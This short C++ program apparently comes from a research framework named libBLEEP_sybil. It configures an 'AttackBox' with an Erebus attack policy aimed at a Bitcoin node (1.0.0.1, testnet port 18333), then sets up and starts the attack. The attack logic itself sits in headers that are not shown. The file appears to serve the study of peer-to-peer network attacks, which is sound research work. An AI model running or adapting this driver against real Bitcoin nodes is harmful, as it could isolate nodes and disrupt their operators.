//
// Created by ilios on 21. 2. 23..
//

#include <bitcoind.h>
#include "AttackBox.h"
#include "policy/ErebusAttackPolicy.h"
#include "ipdb/BitcoinIPDatabase.h"
#include "nodePrimitives/BitcoinNodePrimitives.h"
#include "nodeParams/BitcoinNodeParams.h"

using namespace libBLEEP_sybil;

int main() {
    exported_main(); // initialize bitcoin

    AttackBox<ErebusAttackPolicy, BitcoinNodePrimitives, BitcoinNodeParams, BitcoinIPDatabase> attackBox;
    attackBox.setTarget("1.0.0.1", 18333);
    if (!attackBox.setupAttack()) {
        std::cout << "setup attack failed" << "\n";
        return -1;
    }
    attackBox.startAttack();
    std::cout << "attack finished" << "\n";

    return 0;
}
